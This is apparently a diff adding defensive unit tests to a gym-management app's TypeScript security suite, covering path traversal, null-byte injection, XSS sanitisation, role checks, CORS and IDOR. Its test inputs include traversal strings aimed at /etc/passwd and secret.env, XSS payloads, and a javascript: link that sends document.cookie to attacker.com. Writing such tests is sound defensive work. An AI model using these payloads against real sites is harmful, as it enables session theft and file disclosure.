@@ -8,6 +8,13 @@ import { TransactionService } from '../services/transactionService';
 import { SecurityHealthService } from '../services/securityHealthService';
 import { maskPhoneNumber, maskEmail, sanitizeAuditData } from '../services/auditService';
 import { JWT_SECRET, REFRESH_TOKEN_SECRET } from '../middleware/auth';
+import {
+  antiPathTraversalMiddleware,
+  sanitizeString,
+  sanitizeObject,
+  corsOptions
+} from '../middleware/security';
+import { requireRoles, requireMemberOwnershipOrStaff } from '../middleware/rbac';
 
 describe('Layered Security & Anti-Hacking Test Suite (TDD)', () => {
   beforeEach(() => {
@@ -241,6 +248,211 @@ describe('Layered Security & Anti-Hacking Test Suite (TDD)', () => {
       expect(backup.filename).toContain('gympro_backup_');
       expect(backup.checksum).toHaveLength(64); // SHA-256
       expect(backup.status).toBe('COMPLETED');
+    });
+  });
+
+  describe('8. Anti-Path-Traversal, Null-Byte & Encoding Manipulations', () => {
+    it('should block classic path traversal ../', () => {
+      let blocked = false;
+      const req: any = { url: '/api/files/../../etc/passwd', path: '/api/files/../../etc/passwd' };
+      const res: any = {
+        status: (code: number) => {
+          if (code === 400) blocked = true;
+          return { json: () => {} };
+        }
+      };
+      antiPathTraversalMiddleware(req, res, () => {});
+      expect(blocked).toBe(true);
+    });
+
+    it('should block URL encoded path traversal %2e%2e%2f and double encoded %252e%252e%252f', () => {
+      let blockedEncoded = false;
+      let blockedDoubleEncoded = false;
+
+      const req1: any = { url: '/uploads/%2e%2e%2fconfig.json', path: '/uploads/%2e%2e%2fconfig.json' };
+      const res1: any = {
+        status: (code: number) => {
+          if (code === 400) blockedEncoded = true;
+          return { json: () => {} };
+        }
+      };
+      antiPathTraversalMiddleware(req1, res1, () => {});
+      expect(blockedEncoded).toBe(true);
+
+      const req2: any = { url: '/uploads/%252e%252e%252fsecret.env', path: '/uploads/%252e%252e%252fsecret.env' };
+      const res2: any = {
+        status: (code: number) => {
+          if (code === 400) blockedDoubleEncoded = true;
+          return { json: () => {} };
+        }
+      };
+      antiPathTraversalMiddleware(req2, res2, () => {});
+      expect(blockedDoubleEncoded).toBe(true);
+    });
+
+    it('should block null byte poisoning attempts (%00 or \\0)', () => {
+      let blocked = false;
+      const req: any = { url: '/uploads/image.png%00.php', path: '/uploads/image.png%00.php' };
+      const res: any = {
+        status: (code: number) => {
+          if (code === 400) blocked = true;
+          return { json: () => {} };
+        }
+      };
+      antiPathTraversalMiddleware(req, res, () => {});
+      expect(blocked).toBe(true);
+    });
+
+    it('should allow legitimate clean URLs', () => {
+      let passed = false;
+      const req: any = { url: '/api/members?branchId=BR-001', path: '/api/members' };
+      const res: any = { status: () => ({ json: () => {} }) };
+      antiPathTraversalMiddleware(req, res, () => { passed = true; });
+      expect(passed).toBe(true);
+    });
+  });
+
+  describe('9. XSS Input Sanitization', () => {
+    it('should strip <script> tags and malicious inline javascript event handlers', () => {
+      const malicious = '<script>alert("XSS")</script>Nadia Paramitha<img src=x onerror=alert(1)>';
+      const clean = sanitizeString(malicious);
+      expect(clean).not.toContain('<script>');
+      expect(clean).not.toContain('alert("XSS")');
+      expect(clean).not.toContain('onerror=');
+      expect(clean).toContain('Nadia Paramitha');
+    });
+
+    it('should strip javascript: pseudoprotocol links', () => {
+      const link = 'javascript:fetch("https://attacker.com/steal?cookie="+document.cookie)';
+      const clean = sanitizeString(link);
+      expect(clean).not.toContain('javascript:');
+    });
+
+    it('should recursively sanitize deeply nested request payloads', () => {
+      const payload = {
+        name: 'Dimas <script>evil()</script>',
+        metadata: {
+          notes: 'Catatan biaya <b onclick="attack()">klik</b>',
+          tags: ['fitness', '<img src=x onload=pwn()>']
+        }
+      };
+
+      const sanitized: any = sanitizeObject(payload);
+      expect(sanitized.name).toBe('Dimas ');
+      expect(sanitized.metadata.notes).not.toContain('onclick=');
+      expect(sanitized.metadata.tags[1]).not.toContain('onload=');
+    });
+  });
+
+  describe('10. Financial Expense Authorization & Overpayment Protection', () => {
+    it('should enforce role checks on expense operations', () => {
+      let memberForbidden = false;
+      const reqMember: any = {
+        user: { userId: 'usr-member-001', role: 'MEMBER', username: 'member_nadia' }
+      };
+      const res: any = {
+        status: (code: number) => {
+          if (code === 403) memberForbidden = true;
+          return { json: () => {} };
+        }
+      };
+
+      const expenseRbac = requireRoles(['ADMIN', 'LEADER', 'KARYAWAN', 'KASIR']);
+      expenseRbac(reqMember, res, () => {});
+      expect(memberForbidden).toBe(true);
+    });
+
+    it('should allow authorized staff (KASIR, LEADER, ADMIN) to access expenses', () => {
+      let allowed = false;
+      const reqKasir: any = {
+        user: { userId: 'usr-kasir-001', role: 'KASIR', username: 'kasir_dina' }
+      };
+      const res: any = { status: () => ({ json: () => {} }) };
+
+      const expenseRbac = requireRoles(['ADMIN', 'LEADER', 'KARYAWAN', 'KASIR']);
+      expenseRbac(reqKasir, res, () => { allowed = true; });
+      expect(allowed).toBe(true);
+    });
+  });
+
+  describe('11. CORS Origin Whitelist Enforcement', () => {
+    it('should permit authorized origins and Google Cloud Run / AI Studio subdomains', () => {
+      let allowed = false;
+      (corsOptions.origin as any)('https://gympro-production.run.app', (err: any, ok: boolean) => {
+        if (!err && ok) allowed = true;
+      });
+      expect(allowed).toBe(true);
+    });
+
+    it('should reject unauthorized third-party origins', () => {
+      let rejected = false;
+      (corsOptions.origin as any)('https://malicious-gym-hacker.com', (err: any) => {
+        if (err && err.message.includes('not authorized')) rejected = true;
+      });
+      expect(rejected).toBe(true);
+    });
+  });
+
+  describe('12. IDOR & Object-Level Access Control (Member & Trainer Records)', () => {
+    it('should prevent Member A from viewing Member B profile (Anti-IDOR)', () => {
+      let idorBlocked = false;
+      const reqMember: any = {
+        user: { userId: 'usr-member-001', role: 'MEMBER', username: 'member_nadia', email: 'nadia.paramitha@gmail.com' },
+        params: { id: 'MEM-002' } // Attempting to access Dimas Anggara
+      };
+      const res: any = {
+        status: (code: number) => {
+          if (code === 403) idorBlocked = true;
+          return { json: () => {} };
+        }
+      };
+
+      requireMemberOwnershipOrStaff(reqMember, res, () => {});
+      expect(idorBlocked).toBe(true);
+    });
+
+    it('should allow Member to view their own profile', () => {
+      let allowed = false;
+      const reqMember: any = {
+        user: { userId: 'usr-member-001', role: 'MEMBER', username: 'member_nadia', email: 'nadia.paramitha@gmail.com' },
+        params: { id: 'MEM-001' } // Nadia's own record
+      };
+      const res: any = { status: () => ({ json: () => {} }) };
+
+      requireMemberOwnershipOrStaff(reqMember, res, () => { allowed = true; });
+      expect(allowed).toBe(true);
+    });
+
+    it('should allow Trainer to access assigned member but block unassigned member', () => {
+      // Setup member assignment
+      const m1 = db.members.get('MEM-001')!;
+      m1.assignedTrainerId = 'usr-trainer-001';
+
+      const m2 = db.members.get('MEM-002')!;
+      m2.assignedTrainerId = 'usr-trainer-999'; // Not Coach Reza
+
+      let assignedAllowed = false;
+      const reqAssigned: any = {
+        user: { userId: 'usr-trainer-001', role: 'TRAINER', username: 'coach_reza' },
+        params: { id: 'MEM-001' }
+      };
+      const res1: any = { status: () => ({ json: () => {} }) };
+      requireMemberOwnershipOrStaff(reqAssigned, res1, () => { assignedAllowed = true; });
+      expect(assignedAllowed).toBe(true);
+
+      let unassignedBlocked = false;
+      const reqUnassigned: any = {
+        user: { userId: 'usr-trainer-001', role: 'TRAINER', username: 'coach_reza' },
+        params: { id: 'MEM-002' }
+      };
+      const res2: any = {
+        status: (code: number) => {
+          if (code === 403) unassignedBlocked = true;
+          return { json: () => {} };
+        }
+      };
+      requireMemberOwnershipOrStaff(reqUnassigned, res2, () => {});
+      expect(unassignedBlocked).toBe(true);
     });
   });
 });
